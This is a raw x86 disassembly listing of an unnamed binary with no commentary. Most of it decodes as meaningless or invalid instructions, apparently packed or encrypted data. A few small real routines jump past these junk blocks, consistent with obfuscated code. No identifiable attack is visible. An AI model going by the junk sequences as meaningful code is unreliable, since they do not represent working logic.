  40ce60:	add    eax,0x87cf4e97
  40ce65:	sbb    DWORD PTR [edi-0x50],ebx
  40ce68:	mov    bh,0x7a
  40ce6a:	test   BYTE PTR [ebx+0x59],bh
  40ce6d:	cwde   
  40ce6e:	jne    0x40ced3
  40ce70:	xchg   ebx,eax
  40ce71:	icebp  
  40ce72:	and    ebx,eax
  40ce74:	cmp    al,0x65
  40ce76:	out    dx,eax
  40ce77:	cmp    cl,BYTE PTR [ebx]
  40ce79:	xor    eax,0x5cc1660
  40ce7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce7f:	adc    al,BYTE PTR [edi+0x7d]
  40ce82:	sub    al,BYTE PTR [edi+0x70]
  40ce85:	pop    edi
  40ce86:	jae    0x40cea4
  40ce88:	imul   esi,edx,0xffffff89
  40ce8b:	mov    esi,ecx
  40ce8d:	into   
  40ce8e:	rol    bl,0xad
  40ce91:	and    BYTE PTR [ebp+0x4c],al
  40ce94:	dec    ebp
  40ce95:	iret   
  40ce96:	popf   
  40ce97:	loope  0x40ce6a
  40ce99:	mov    ds:0x9fb75826,al
  40ce9e:	test   BYTE PTR [eax],al
  40cea0:	sbb    DWORD PTR gs:[esp+ebx*8+0x85ab4fd],0xf5a2254e
  40ceac:	imul   edx,esi,0xa143ee77
  40ceb2:	add    esi,DWORD PTR ds:0x64f1d897
  40ceb8:	shl    BYTE PTR [edx+0x653667b4],0x73
  40cebf:	add    DWORD PTR [edx],ebx
  40cec1:	(bad)  
  40cec2:	(bad)  
  40cec4:	cmp    ebp,DWORD PTR [ebp-0x5ece10ff]
  40ceca:	stos   BYTE PTR es:[edi],al
  40cecb:	mov    eax,DWORD PTR [ebp+edi*8-0x6]
  40cecf:	(bad)  
  40ced0:	into   
  40ced1:	sbb    eax,0xc5bb4e1b
  40ced6:	(bad)  
  40ced7:	leave  
  40ced8:	inc    ecx
  40ced9:	inc    esp
  40ceda:	cmp    eax,0x794c2eda
  40cedf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cee0:	in     al,dx
  40cee1:	and    DWORD PTR ds:0x246c8a23,esp
  40cee7:	retf   0x5711
  40ceea:	pop    esp
  40ceeb:	push   0x1ae57060
  40cef0:	adc    al,0x14
  40cef2:	xlat   BYTE PTR ds:[ebx]
  40cef3:	and    DWORD PTR [edx],esi
  40cef5:	cmp    DWORD PTR [esi],edx
  40cef7:	es inc esp
  40cef9:	dec    ebx
  40cefa:	inc    edi
  40cefb:	outs   dx,BYTE PTR ds:[esi]
  40cefc:	jns    0x40cf34
  40cefe:	repnz pop esi
  40cf00:	hlt    
  40cf01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf02:	cmp    BYTE PTR [ebx+0x3c],bh
  40cf05:	hlt    
  40cf06:	test   eax,0x4e9538c2
  40cf0b:	sbb    al,0x6
  40cf0d:	jnp    0x40cf5d
  40cf0f:	(bad)
  40cf12:	mov    edx,0x397c33b6
  40cf17:	mov    ebp,0xda3ae86e
  40cf1c:	loop   0x40ced9
  40cf1e:	sbb    eax,0x4813af5e
  40cf23:	xchg   ch,ah
  40cf25:	outs   dx,BYTE PTR ds:[esi]
  40cf26:	outs   dx,DWORD PTR ds:[esi]
  40cf27:	shl    ebp,0x30
  40cf2a:	fild   QWORD PTR [esi-0x57a4b81a]
  40cf30:	icebp  
  40cf31:	in     al,dx
  40cf32:	jmp    0xe78b:0x6f34267b
  40cf39:	adc    esp,eax
  40cf3b:	cmp    al,0x4b
  40cf3d:	outs   dx,DWORD PTR ds:[esi]
  40cf3e:	adc    eax,0x9fb65927
  40cf43:	lock ficom DWORD PTR [edx]
  40cf46:	mov    ds:0x5cff1b44,al
  40cf4b:	mov    cl,0x51
  40cf4d:	xchg   ecx,eax
  40cf4e:	std    
  40cf4f:	mov    edx,0x24d3d4cf
  40cf54:	mov    BYTE PTR [esi-0x2],bh
  40cf57:	mov    edx,0xe7648cb1
  40cf5c:	and    BYTE PTR [esi+0x19],dh
  40cf5f:	pop    ecx
  40cf60:	ins    BYTE PTR es:[edi],dx
  40cf61:	ins    BYTE PTR es:[edi],dx
  40cf62:	stc    
  40cf63:	inc    ecx
  40cf64:	xchg   ecx,eax
  40cf65:	and    bl,BYTE PTR [edx+0x4766ee8d]
  40cf6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf6c:	pop    ebp
  40cf6d:	cmp    al,0x73
  40cf6f:	fistp  WORD PTR [edi]
  40cf71:	mov    ch,0x29
  40cf73:	push   esp
  40cf74:	ds push 0x62
  40cf77:	dec    ebx
  40cf78:	(bad)  
  40cf7a:	pop    esp
  40cf7b:	gs scas al,BYTE PTR es:[edi]
  40cf7d:	les    ecx,FWORD PTR [esi*1+0x6a2551ce]
  40cf84:	cdq    
  40cf85:	retf   0xbdb4
  40cf88:	inc    ebp
  40cf89:	cmp    esp,eax
  40cf8b:	sbb    ecx,DWORD PTR [edi]
  40cf8d:	test   BYTE PTR [ebp-0x1a],dl
  40cf90:	(bad)  
  40cf91:	(bad)  
  40cf92:	mov    eax,0x800f1c81
  40cf97:	jmp    0x40b5ee
  40cf9c:	push   ebp
  40cf9d:	mov    ebp,esp
  40cf9f:	sub    esp,0x60
  40cfa2:	sbb    DWORD PTR ds:0x42a845,0x18d1
  40cfac:	mov    eax,DWORD PTR [ebp+0x8]
  40cfaf:	xor    DWORD PTR ds:0x42a879,0x42a75d
  40cfb9:	jmp    0x40d211
  40cfbe:	ror    esp,1
  40cfc0:	mov    dh,0xc5
  40cfc3:	fcmovbe st,st(1)
  40cfc5:	(bad)  [esi]
  40cfc7:	push   ds
  40cfc8:	aad    0x62
  40cfca:	fild   WORD PTR [eax*1+0x78a72a5e]
  40cfd1:	js     0x40d008
  40cfd3:	jle    0x40d04d
  40cfd5:	js     0x40cf5f
  40cfd7:	mov    esp,esi
  40cfd9:	hlt    
  40cfda:	(bad)  
  40cfdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfdc:	jle    0x40d034
  40cfde:	clc    
  40cfdf:	int    0x30
  40cfe1:	sub    DWORD PTR [ebx-0x78],0x59
  40cfe5:	arpl   WORD PTR [edi-0x4e],cx
  40cfe8:	jb     0x40d01e
  40cfea:	sbb    DWORD PTR [edi+0x147413f0],ebp
  40cff0:	ss and DWORD PTR gs:[eax-0xb2f00b],esp
  40cff8:	daa    
  40cff9:	test   eax,0x8024b81a
  40cffe:	add    al,ch
  40d000:	push   ss
  40d001:	dec    ecx
  40d002:	aaa    
  40d003:	bound  esi,QWORD PTR [esi-0x5dc029c3]
  40d009:	and    dh,BYTE PTR [esi-0x2f]
  40d00c:	mov    eax,esi
  40d00e:	dec    esp
  40d00f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d010:	cld    
  40d011:	mov    esi,0x6e806477
  40d016:	dec    edi
  40d017:	mov    ds:0xb2f303f0,al
  40d01c:	in     al,0x26
  40d01e:	sahf   
  40d01f:	and    BYTE PTR [ebx-0x6b],0x72
  40d023:	imul   ecx,DWORD PTR [ebx+0x637c01ff],0xffffffce
  40d02a:	push   esi
  40d02b:	ins    DWORD PTR es:[edi],dx
  40d02c:	pushf  
  40d02d:	je     0x40d001
  40d02f:	cdq    
  40d030:	sub    ebx,esp
  40d032:	mov    dl,0x32
  40d034:	xchg   esp,eax
  40d035:	xchg   edi,eax
  40d036:	rcl    BYTE PTR [eax+0x560dd353],1
  40d03c:	pusha  
  40d03d:	xlat   BYTE PTR ds:[ebx]
  40d03e:	out    dx,al
  40d03f:	in     al,0xae
  40d041:	repz dec esp
  40d043:	push   ecx
  40d044:	add    bh,bh
  40d046:	jle    0x40d063
  40d048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d049:	iret   
  40d04a:	cs mov esi,0x47f3ff9d
  40d050:	popf   
  40d051:	inc    ebx
  40d052:	pop    ss
  40d053:	cwde   
  40d054:	ss inc esp
  40d056:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d057:	jmp    0xbce1:0x7716b3f3
  40d05e:	inc    esp
  40d05f:	jge    0x40d057
  40d061:	out    dx,al
  40d062:	and    eax,0x7ea6a499
  40d067:	fdivr  QWORD PTR [edi-0x6b8906c8]
  40d06d:	test   al,0x2
  40d06f:	push   ebp
  40d070:	fstp   QWORD PTR [ecx-0xd645c4e]
  40d076:	lods   al,BYTE PTR ds:[esi]
  40d077:	jmp    0x3803efd5
  40d07c:	jne    0x40d068
  40d07e:	ja     0x40d02d
  40d080:	pop    ebp
  40d081:	cmp    cl,BYTE PTR ds:0x1e1ece90
  40d087:	call   0x9070900e
  40d08c:	mov    DWORD PTR [edx+eiz*1+0x1c],edx
  40d090:	xchg   esp,eax
  40d091:	jne    0x40d062
  40d093:	sbb    eax,0xf90587de
  40d098:	sbb    DWORD PTR [edx-0x7af4444e],ebx
  40d09e:	ins    BYTE PTR es:[edi],dx
  40d09f:	sahf   
  40d0a0:	outs   dx,BYTE PTR ds:[esi]
  40d0a1:	jg     0x40d0d1
  40d0a3:	pop    eax
  40d0a4:	push   edi
  40d0a5:	jmp    0x687487d8
  40d0aa:	mov    dh,BYTE PTR [ebx+0x12]
  40d0ad:	or     ebx,ebx
  40d0af:	cmp    DWORD PTR [ebx-0x6c],esp
  40d0b2:	push   ebx
  40d0b3:	jmp    0x7cb3:0xfd694082
  40d0ba:	call   FWORD PTR [ebx-0x6f]
  40d0bd:	or     eax,0xdd228c7a
  40d0c2:	dec    ebp
  40d0c3:	or     ebp,DWORD PTR [edi]
  40d0c5:	pop    ds
  40d0c6:	add    esi,ecx
  40d0c8:	retf   0xa64f
  40d0cb:	sub    bl,dh
  40d0cd:	std    
  40d0ce:	add    BYTE PTR [edi-0x42],al
  40d0d1:	cmp    bl,ah
  40d0d3:	lock bound esp,QWORD PTR [edx]
  40d0d6:	pop    ss
  40d0d7:	add    DWORD PTR [ebx-0x54b1dc28],esp
  40d0dd:	jb     0x40d144
  40d0df:	ss xchg esi,eax
  40d0e1:	jmp    0x40d06a
  40d0e3:	sub    dl,BYTE PTR [ebx]
  40d0e5:	or     DWORD PTR [esi-0x57],ecx
  40d0e8:	mov    eax,0xda442a5
  40d0ed:	(bad)  
  40d0ef:	lea    ecx,[eax+esi*1]
  40d0f2:	ja     0x40d0f3
  40d0f4:	aam    0x5c
  40d0f6:	(bad)  [edx]
  40d0f8:	xlat   BYTE PTR ds:[ebx]
  40d0f9:	dec    ebp
  40d0fa:	retf   0xc4fd
  40d0fd:	popf   
  40d0fe:	(bad)  
  40d0ff:	xchg   esp,eax
  40d100:	mov    BYTE PTR [ebp-0x26],bl
  40d103:	dec    BYTE PTR [edi]
  40d105:	xchg   esp,eax
  40d106:	cmp    BYTE PTR ds:0xc552137a,bl
  40d10c:	pop    ebp
  40d10d:	mov    ebp,0xd4651d98
  40d112:	or     ch,BYTE PTR [esi-0x763d48af]
  40d118:	fadd   QWORD PTR [edx-0x13a42d8d]
  40d11e:	mov    edi,0xaae2bea3
  40d123:	and    ebp,DWORD PTR [edi]
  40d125:	lock mov bh,BYTE PTR [ebp+0x54]
  40d129:	loopne 0x40d180
  40d12b:	mov    ds:0xe3b1219e,eax
  40d130:	or     DWORD PTR [esi-0x64eeb6fe],0xffffffdc
  40d137:	(bad)  
  40d138:	pusha  
  40d139:	mov    ah,0xdc
  40d13b:	and    BYTE PTR [esi+0xe189116],dl
  40d141:	out    0x9,al
  40d143:	sbb    ecx,DWORD PTR [ecx-0x66647405]
  40d149:	mov    es,WORD PTR [edi+0x5830fb75]
  40d14f:	cmp    DWORD PTR [ebx],edi
  40d151:	jne    0x40d1aa
  40d153:	hlt    
  40d154:	ins    DWORD PTR es:[edi],dx
  40d155:	test   eax,0xf5a44343
  40d15a:	push   ds
  40d15b:	ds aad 0x9
  40d15e:	and    BYTE PTR [edi+0x9552bcf],al
  40d164:	repnz dec ebp
  40d166:	(bad)  
  40d167:	ins    DWORD PTR es:[edi],dx
  40d168:	jne    0x40d135
  40d16a:	aam    0xe1
  40d16c:	sbb    eax,0xe2f41f41
  40d171:	and    dl,dl
  40d173:	in     eax,dx
  40d174:	mov    edi,0xb924eb0b
  40d179:	stc    
  40d17a:	dec    esp
  40d17b:	push   eax
  40d17c:	mov    ebp,0x4152be65
  40d181:	in     al,0x49
  40d183:	and    eax,0x71004fa6
  40d188:	mov    al,0x8
  40d18a:	jg     0x40d18e
  40d18c:	daa    
  40d18d:	lods   al,BYTE PTR ds:[esi]
  40d18e:	add    dh,cl
  40d190:	scas   eax,DWORD PTR es:[edi]
  40d191:	mov    bl,0x44
  40d193:	ror    BYTE PTR [ebp-0x5384c281],cl
  40d199:	popa   
  40d19a:	cmp    BYTE PTR [eax-0x7f],bl
  40d19d:	das    
  40d19e:	cmp    DWORD PTR [eax-0x296b5f88],eax
  40d1a4:	loope  0x40d1a6
  40d1a6:	cmp    DWORD PTR [esi-0x2c],eax
  40d1a9:	xor    al,BYTE PTR [ebp-0x7c]
  40d1ac:	and    edi,DWORD PTR [edi]
  40d1ae:	cwde   
  40d1af:	xchg   BYTE PTR [edx-0x3a],bl
  40d1b2:	gs inc esi
  40d1b4:	mov    ecx,0x71bc6d3b
  40d1b9:	out    0x8e,eax
  40d1bb:	shl    BYTE PTR [eax-0x32],0x39
  40d1bf:	jns    0x40d17e
  40d1c1:	or     DWORD PTR [eax],esp
  40d1c3:	dec    edx
  40d1c4:	retf   
  40d1c5:	imul   BYTE PTR [esi-0x78b4dba]
  40d1cb:	jns    0x40d246
  40d1cd:	add    BYTE PTR [eax+0x3c],ch
  40d1d0:	ror    ch,0x69
  40d1d3:	jo     0x40d1d6
  40d1d5:	bound  ecx,QWORD PTR [esi]
  40d1d7:	hlt    
  40d1d8:	out    0xe2,eax
  40d1da:	jl     0x40d190
  40d1dc:	and    ebx,eax
  40d1de:	add    DWORD PTR ds:0xdd6be546,edx
  40d1e4:	cmp    DWORD PTR [eax+0x55],ecx
  40d1e7:	cli    
  40d1e8:	cli    
  40d1e9:	lods   al,BYTE PTR ds:[esi]
  40d1ea:	mov    dh,0x9a
  40d1ec:	fimul  DWORD PTR [edx+0x65]
  40d1ef:	mov    ebx,0xf3fd17e6
  40d1f4:	setbe  BYTE PTR [edi+0x61bd87bc]
  40d1fb:	mov    al,0xb6
  40d1fd:	add    al,0xf
  40d1ff:	aas    
  40d200:	push   ss
  40d201:	ins    BYTE PTR es:[edi],dx
  40d202:	fs sbb al,0x1f
  40d205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d206:	jae    0x40d25f
  40d208:	ds int3 
  40d20a:	imul   edx,esi,0xffffffed
  40d20d:	(bad)
  40d210:	cwde   
  40d211:	push   ebx
  40d212:	push   esi
  40d213:	and    DWORD PTR ds:0x42a7b5,0x0
  40d21d:	jmp    0x40d22f
  40d222:	mov    ebx,DWORD PTR ds:0x42a7b5
  40d228:	inc    ebx
  40d229:	mov    DWORD PTR ds:0x42a7b5,ebx
  40d22f:	cmp    DWORD PTR ds:0x42a7b5,0x1d
  40d236:	jae    0x40d254
  40d23c:	cmp    DWORD PTR ds:0x42a7b5,0x26
  40d243:	jne    0x40d24f
  40d249:	call   DWORD PTR ds:0x41d24c
  40d24f:	jmp    0x40d222
  40d254:	mov    esi,0x7510850
  40d259:	movzx  ebx,WORD PTR ds:0x42a775
  40d260:	xor    ebx,DWORD PTR ds:0x42a75d
  40d266:	mov    DWORD PTR ds:0x42a775,ebx
  40d26c:	xor    eax,esi
  40d26e:	or     ebx,0x7ad4
  40d274:	mov    ebx,0x327298
  40d279:	adc    DWORD PTR ds:0x42a7bd,0x42a879
  40d283:	add    eax,ebx
  40d285:	sub    DWORD PTR ds:0x42a889,0x2a37
  40d28f:	push   edi
  40d290:	mov    DWORD PTR [ebp-0x18],eax
  40d293:	adc    DWORD PTR ds:0x42a879,0x18
  40d29d:	mov    edi,DWORD PTR [ebp+0x8]
  40d2a0:	neg    DWORD PTR ds:0x42a845
  40d2a6:	xor    edi,esi
  40d2a8:	jmp    0x40d500
  40d2ad:	int    0xca
  40d2af:	iret   
  40d2b0:	retf   0xd9db
  40d2b3:	(bad)  
  40d2b5:	and    ah,ah
  40d2b7:	push   ecx
  40d2b8:	pusha  
  40d2b9:	mov    ah,0xd9
  40d2bb:	sahf   
  40d2bc:	pop    ecx
  40d2bd:	out    0xa5,eax
  40d2bf:	js     0x40d339
  40d2c1:	xor    eax,0x8478787e
  40d2c6:	push   ss
  40d2c7:	cmp    al,0xdf
  40d2c9:	mov    ah,0x97
  40d2cb:	mov    WORD PTR [edi],?
  40d2cd:	into   
  40d2ce:	push   ss
  40d2cf:	es mov edx,0x36c491e9
  40d2d5:	ds cdq 
  40d2d7:	pop    eax
  40d2d8:	inc    ebx
  40d2d9:	jecxz  0x40d2ea
  40d2db:	inc    edi
  40d2dc:	lds    edi,FWORD PTR fs:[esi]
  40d2df:	xchg   ebp,esp
  40d2e1:	push   ecx
  40d2e2:	xchg   dh,ch
  40d2e4:	scas   eax,DWORD PTR es:[edi]
  40d2e5:	in     eax,dx
  40d2e6:	stos   DWORD PTR es:[edi],eax
  40d2e7:	mov    edx,0x4bb6f55e
  40d2ec:	leave  
  40d2ed:	lds    esp,FWORD PTR ds:0x71c1bacd
  40d2f3:	add    eax,0xf72e343b
  40d2f8:	xchg   ecx,eax
  40d2f9:	dec    ebp
  40d2fa:	mov    dl,0x34
  40d2fc:	cmp    BYTE PTR [edx],bh
  40d2fe:	sbb    BYTE PTR [edi],bl
  40d300:	rcr    edx,1
  40d302:	push   0xffffff94
  40d304:	sub    ebx,DWORD PTR [edx]
  40d306:	call   0xbd1f98dc
  40d30b:	call   0x75ce034a
  40d310:	push   eax
  40d311:	xor    dh,BYTE PTR [ecx-0x3d]
  40d314:	add    BYTE PTR [edx+eax*4],ch
  40d317:	xor    BYTE PTR [ebx-0x2e],ch
  40d31a:	les    ecx,FWORD PTR [edx-0x43cee27e]
  40d320:	mov    ds:0x47c13f77,al
  40d326:	or     eax,0xe393a898
  40d32b:	push   esi
  40d32c:	stc    
  40d32d:	out    0xf7,al
  40d32f:	das    
  40d330:	and    bh,BYTE PTR [edx]
  40d332:	retf   
  40d333:	mov    ss,WORD PTR [ecx]
  40d335:	imul   DWORD PTR [eax]
  40d337:	xor    BYTE PTR [edx],dh
  40d339:	xor    al,0x2a
  40d33b:	push   ebp
  40d33c:	shl    esp,1
  40d33e:	cs cmp al,0xbf
  40d341:	jle    0x40d31a
  40d343:	int    0xf1
  40d345:	cmp    edi,DWORD PTR [edx-0x69]
  40d348:	cmp    BYTE PTR [edi-0x78922a38],al
  40d34e:	(bad)  
  40d350:	jbe    0x40d322
  40d352:	or     BYTE PTR [esi+0x41],0x16
  40d356:	pushf  
  40d357:	mov    cl,0x15
  40d359:	jge    0x40d31d
  40d35b:	mov    ds:0x670565e6,eax
  40d360:	in     al,0x33
  40d362:	pop    ebp
  40d363:	xchg   edx,eax
  40d364:	and    DWORD PTR [eax],0x2b
  40d367:	not    al
  40d369:	stos   BYTE PTR es:[edi],al
  40d36a:	add    dl,bh
  40d36c:	int3   
  40d36d:	xor    al,0xf
  40d36f:	stos   DWORD PTR es:[edi],eax
  40d370:	bound  eax,QWORD PTR [edx]
  40d372:	imul   ebx,DWORD PTR [ebx-0x34],0x81e2ec1a
  40d379:	push   cs
  40d37a:	jne    0x40d3b6
  40d37c:	in     al,0x33
  40d37e:	inc    ebx
  40d37f:	addr16 add eax,0xf0e70a1
  40d385:	sbb    eax,0xc3b4af6d
  40d38a:	add    eax,0x1d456f69
  40d38f:	jne    0x40d3c3
  40d391:	jbe    0x40d3f5
  40d393:	ficom  DWORD PTR [ecx-0x11eb8aed]
  40d399:	ret    
  40d39a:	das    
  40d39b:	jo     0x40d41c
  40d39d:	pop    ebx
  40d39e:	adc    al,0x21
  40d3a0:	add    al,0x57
  40d3a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3a3:	xchg   edx,eax
  40d3a4:	fdivr  st,st(2)
  40d3a6:	xor    al,0x76
  40d3a8:	es in  eax,dx
  40d3aa:	and    bl,BYTE PTR [ebx]
  40d3ac:	adc    al,0xc9
  40d3ae:	dec    esp
  40d3af:	shr    BYTE PTR [ebx],cl
  40d3b1:	mov    WORD PTR [edi-0x1d],fs
  40d3b4:	inc    BYTE PTR [esp+ebp*1]
  40d3b7:	mov    esp,0x68c5bba1
  40d3bc:	lods   al,BYTE PTR ds:[esi]
  40d3bd:	sub    al,0xb3
  40d3bf:	ds je  0x40d376
  40d3c2:	mov    esp,0x9b3e3901
  40d3c7:	lods   eax,DWORD PTR ds:[esi]
  40d3c8:	(bad)
  40d3cc:	cmp    DWORD PTR [ebp-0x19],edx
  40d3cf:	gs xchg esp,eax
  40d3d1:	mov    al,ds:0x729f13af
  40d3d6:	fadd   st(1),st
  40d3d8:	(bad)  
  40d3d9:	jne    0x40d3f2
  40d3db:	fnstsw WORD PTR [eax-0x31b07d3d]
  40d3e1:	inc    esi
  40d3e2:	pop    ebx
  40d3e3:	push   cs
  40d3e4:	or     BYTE PTR [ecx],0xdd
  40d3e7:	pop    edi
  40d3e8:	inc    eax
  40d3e9:	and    al,0x1
  40d3eb:	dec    dl
  40d3ed:	mov    edx,0xa03eb449
  40d3f2:	xlat   BYTE PTR ds:[ebx]
  40d3f3:	and    eax,0x3c7cc79b
  40d3f8:	pop    eax
  40d3f9:	test   eax,0x2ea4ee1d
  40d3fe:	xchg   BYTE PTR [ebx-0x51f691a6],dh
  40d404:	pop    ecx
  40d405:	xlat   BYTE PTR ds:[ebx]
  40d406:	inc    ebp
  40d407:	fwait
  40d408:	scas   al,BYTE PTR es:[edi]
  40d409:	cli    
  40d40a:	or     BYTE PTR [ebp-0x67],dl
  40d40d:	fucomp st(4)
  40d40f:	sbb    BYTE PTR [ecx],cl
  40d411:	mov    ds:0xf030565c,al
  40d416:	mov    dl,0x47
  40d418:	loop   0x40d47a
  40d41a:	dec    ebx
  40d41b:	sti    
  40d41c:	dec    ebx
  40d41d:	push   ss
  40d41e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d41f:	lds    ecx,FWORD PTR [ecx+0x16]
  40d422:	or     DWORD PTR [edi+0x3d],0xfffffff3
  40d426:	and    eax,0xe646961f
  40d42b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d42c:	add    al,0x18
  40d42e:	retf   0xf820
  40d431:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d432:	lods   eax,DWORD PTR cs:[esi]
  40d434:	cmp    ebp,esp
  40d436:	lods   al,BYTE PTR ds:[esi]
  40d437:	inc    ebp
  40d438:	leave  
  40d439:	aad    0x37
  40d43b:	pushf  
  40d43c:	int    0x3d
  40d43e:	pop    es
  40d43f:	inc    edx
  40d440:	(bad)  
  40d441:	sub    ch,BYTE PTR [ebx-0x1a2e758e]
  40d447:	ins    BYTE PTR es:[edi],dx
  40d448:	scas   eax,DWORD PTR es:[edi]
  40d449:	lods   al,BYTE PTR ds:[esi]
  40d44a:	push   ds
  40d44b:	mov    edi,0x9d783df8
  40d450:	or     BYTE PTR [edx+0x57],cl
  40d453:	clc    
  40d454:	scas   al,BYTE PTR es:[edi]
  40d455:	fstp   QWORD PTR [ecx+eax*8]
  40d458:	inc    ebx
  40d459:	cmp    DWORD PTR [ecx-0x2f],0x4282ae25
  40d460:	pop    ebp
  40d461:	arpl   WORD PTR [eax+esi*2],ax
  40d464:	add    DWORD PTR [ecx],edx
  40d466:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d467:	dec    ecx
  40d468:	mov    esi,DWORD PTR [ecx]
  40d46a:	cdq    
  40d46b:	mul    ch
  40d46d:	cmp    DWORD PTR [ebx+0x19386a3],esp
  40d473:	mov    ch,0x3a
  40d475:	jae    0x40d3fd
  40d477:	cmp    eax,DWORD PTR [edx-0x64]
  40d47a:	dec    eax
  40d47b:	test   ch,ah
  40d47d:	scas   eax,DWORD PTR es:[edi]
  40d47e:	adc    DWORD PTR [edx+ebx*8],esp
  40d481:	rcl    BYTE PTR [ecx+ecx*4+0x76809546],0x86
  40d489:	mov    bh,0xf1
  40d48b:	mul    DWORD PTR [ebx+ecx*4-0x371627ad]
  40d492:	dec    edi
  40d493:	loopne 0x40d452
  40d495:	mov    esi,0x78918ea8
  40d49a:	out    dx,al
  40d49b:	ds mov ecx,0x5b3adfc7
  40d4a1:	sbb    DWORD PTR [ecx+0x15],ebx
  40d4a4:	mov    ch,0xb2
  40d4a6:	mov    esi,0x1ddfd810
  40d4ab:	xchg   ecx,eax
  40d4ac:	xor    al,0x71
  40d4ae:	and    esp,DWORD PTR [eax]
  40d4b0:	jno    0x40d520
  40d4b2:	mov    cl,0x3a
  40d4b4:	jne    0x40d447
  40d4b6:	dec    esi
  40d4b7:	mov    dl,0x88
  40d4b9:	in     al,0x9a
  40d4bb:	inc    ebx
  40d4bc:	repnz mov bh,0x4b
  40d4bf:	xor    al,BYTE PTR [eax+0x4fa5911]
  40d4c5:	lods   eax,DWORD PTR ds:[esi]
  40d4c6:	or     eax,0x4e4a68a1
  40d4cb:	mov    esp,0x7fdd0c52
  40d4d0:	shr    DWORD PTR [ebx],cl
  40d4d2:	dec    eax
  40d4d3:	xor    edx,DWORD PTR [ebx-0x71]
  40d4d6:	ins    DWORD PTR es:[edi],dx
  40d4d7:	ficom  WORD PTR [edi-0x63]
  40d4da:	xchg   bl,dl
  40d4dc:	stos   DWORD PTR es:[edi],eax
  40d4dd:	fsubp  st(7),st
  40d4df:	arpl   bp,bp
  40d4e1:	idiv   ah
  40d4e3:	sbb    al,0xb8
  40d4e5:	and    eax,0x710cb5be
  40d4ea:	aam    0x3
  40d4ec:	popf   
  40d4ed:	push   ebp
  40d4ee:	in     eax,dx
  40d4ef:	rcr    DWORD PTR [ebp+0x6b5e66e8],0x23
  40d4f6:	cs pusha 
  40d4f8:	add    edi,DWORD PTR [ecx+edi*1-0xe]
  40d4fc:	ja     0x40d52a
  40d4fe:	shr    DWORD PTR [edx-0x39],1
  40d501:	inc    ebp
  40d502:	hlt    
  40d503:	clc    
  40d504:	test   DWORD PTR [eax+edi*8+0x38f045c7],ebx
  40d50b:	xchg   DWORD PTR [eax+edi*8-0x580ada7f],ebx
  40d512:	inc    edx
  40d513:	add    BYTE PTR ds:0x30042a8,al
  40d519:	sti    
  40d51a:	jmp    0x40e985
  40d51f:	cmp    edi,0x3f
  40d522:	jne    0x40d55a
  40d528:	mov    eax,0x337e
  40d52d:	mov    eax,ds:0x41e966
  40d532:	mov    eax,DWORD PTR [eax]
  40d534:	mov    DWORD PTR [ebp-0x14],eax
  40d537:	mov    eax,ds:0x41eb6e
  40d53c:	mov    DWORD PTR ds:0x42a769,0x45db
  40d546:	mov    eax,DWORD PTR [eax]
  40d548:	mov    DWORD PTR [ebp-0x18],eax
  40d54b:	mov    DWORD PTR ds:0x42a7cd,0x1d30
  40d555:	jmp    0x40e979
  40d55a:	mov    DWORD PTR ds:0x42a835,0x19ca
  40d564:	jmp    0x40d7bc
  40d569:	leave  
  40d56a:	ret    
  40d56b:	enter  0xd6c6,0xd9
  40d56f:	fld    st(3)
  40d571:	int    0x93
  40d573:	fdiv   st,st(0)
  40d575:	fmulp  st(6),st
  40d577:	xchg   ebp,eax
  40d578:	loopne 0x40d516
  40d57a:	stos   DWORD PTR es:[edi],eax
  40d57b:	js     0x40d5f5
  40d57d:	xor    eax,0xc778787e
  40d582:	mov    ebx,0x8b1634ce
  40d587:	das    
  40d588:	push   eax
  40d589:	clc    
  40d58a:	pop    edx
  40d58b:	dec    ecx
  40d58d:	dec    eax
  40d58e:	adc    al,0x91
  40d590:	jae    0x40d537
  40d592:	cmp    esp,edx
  40d594:	and    al,0xd8
  40d596:	scas   eax,DWORD PTR es:[edi]
  40d597:	jo     0x40d5d2
  40d599:	jno    0x40d52b
  40d59b:	jmp    0x6e1f7333
  40d5a0:	and    ebp,DWORD PTR [esi-0x19e83345]
  40d5a6:	ins    DWORD PTR es:[edi],dx
  40d5a7:	adc    esp,DWORD PTR [ebx+ebp*4]
  40d5aa:	mov    bl,0x8e
  40d5ac:	enter  0x8bb7,0xed
  40d5b0:	xchg   ebp,eax
  40d5b1:	xchg   BYTE PTR [edx+0x30],ch
  40d5b4:	es jmp 0x1fec5c54
  40d5ba:	adc    DWORD PTR [eax+edx*4],0xb0c2b08f
  40d5c1:	call   0xd144fc24
  40d5c6:	pushf  
  40d5c7:	rep lods al,BYTE PTR ds:[esi]
  40d5c9:	rcr    DWORD PTR [eax-0x14],0x39
  40d5cd:	adc    dl,BYTE PTR [eax-0x52f4e3dc]
  40d5d3:	hlt    
  40d5d4:	add    al,BYTE PTR [esi+0xd9d53c]
  40d5da:	xor    edx,ebx
  40d5dc:	lahf   
  40d5dd:	cli    
  40d5de:	aam    0x99
  40d5e0:	stos   DWORD PTR es:[edi],eax
  40d5e1:	je     0x40d640
  40d5e3:	out    0xd,eax
  40d5e5:	enter  0x399c,0x19
  40d5e9:	or     ah,BYTE PTR [ecx+0x3ff1e29c]
  40d5ef:	(bad)  
  40d5f0:	ror    DWORD PTR [esi-0x65ac2aa6],1
  40d5f6:	stos   BYTE PTR es:[edi],al
  40d5f7:	sbb    eax,DWORD PTR [esi+0x53a219c]
  40d5fd:	adc    eax,0x7d6655cb
  40d602:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d603:	pop    ebp
  40d604:	jl     0x40d5dd
  40d606:	popa   
  40d607:	lea    edi,[edi-0x353882ee]
  40d60d:	cli    
  40d60e:	pop    ecx
  40d60f:	stos   BYTE PTR es:[edi],al
